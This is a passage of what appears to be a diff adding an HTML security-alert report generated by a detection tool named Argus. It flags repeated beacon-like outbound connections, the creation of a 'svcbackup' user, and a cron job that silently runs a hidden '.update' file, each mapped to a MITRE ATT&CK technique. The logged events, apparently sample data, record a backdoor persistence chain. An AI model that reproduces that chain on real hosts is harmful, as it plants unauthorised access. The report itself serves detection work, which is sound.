style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:19:15</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:20:40</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 4 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:27:45</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Potential C2 Beacon - Repeated Outbound Connections</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1071/001/" style="color:#555;text-decoration:none" target="_blank">
+        T1071.001
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Potential C2 Beacon - Repeated Outbound Connections: 8+ events from dest_ip='91.108.4.200' in 900s window (10 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:15:00</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:16:25</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:17:50</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:19:15</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:20:40</span> <span style="color:#555">network_conn</span> <span style="color:#555">direction=</span><span style="color:#777">outbound</span>  <span style="color:#555">src_ip=</span><span style="color:#777">10.0.1.20</span>  <span style="color:#555">dest_ip=</span><span style="color:#777">91.108.4.200</span>  <span style="color:#555">dest_port=</span><span style="color:#777">443</span>  <span style="color:#555">bytes_out=</span><span style="color:#777">128</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 5 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:30:50</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">New Local User Account Created</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1136/001/" style="color:#555;text-decoration:none" target="_blank">
+        T1136.001
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">New Local User Account Created: user='root'</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:30:50</span> <span style="color:#555">user_created</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">new_user=</span><span style="color:#777">svcbackup</span>  <span style="color:#555">shell=</span><span style="color:#777">/bin/bash</span>  <span style="color:#555">home=</span><span style="color:#777">/var/lib/svcbackup</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:31:10</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Cron Job Added or Modified</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1053/003/" style="color:#555;text-decoration:none" target="_blank">
+        T1053.003
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Cron Job Added or Modified: user='root'</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:31:10</span> <span style="color:#555">cron_modified</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">cron_file=</span><span style="color:#777">/etc/cron.d/svcbackup</span>  <span style="color:#555">detail=</span><span style="color:#777">Added cron: */5 * * * * svcbackup /var/lib/svcbackup/.update &gt;/dev/null 2&gt;&amp;1</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:31:10</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">Persistence Backdoor Chain - New User Followed by Cron Modification</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1136/001/" style="color:#555;text-decoration:none" target="_blank">
+        T1136.001
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Persistence Backdoor Chain - New User Followed by Cron Modification: 2-step sequence completed for host='web-prod-01' over 20s</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:30:50</span> <span style="color:#555">user_created</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">new_user=</span><span style="color:#777">svcbackup</span>  <span style="color:#555">shell=</span><span style="color:#777">/bin/bash</span>  <span style="color:#555">home=</span><span style="color:#777">/var/lib/svcbackup</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:31:10</span> <span style="color:#555">cron_modified</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">cron_file=</span><span style="color:#777">/etc/cron.d/svcbackup</span>  <span style="color:#555">detail=</span><span style="color:#777">Added cron: */5 * * * * svcbackup /var/lib/svcbackup/.update &gt;/dev/null 2&gt;&amp;1</span></div>
+</div>
+
+<footer>
+  Generated by <strong>Argus</strong> &nbsp;|&nbsp;
+  MITRE ATT&amp;CK® is a registered trademark of The MITRE Corporation &nbsp;|&nbsp;
+  For authorised security analysis and educational use only.
+</footer>
+</body>
+</html>
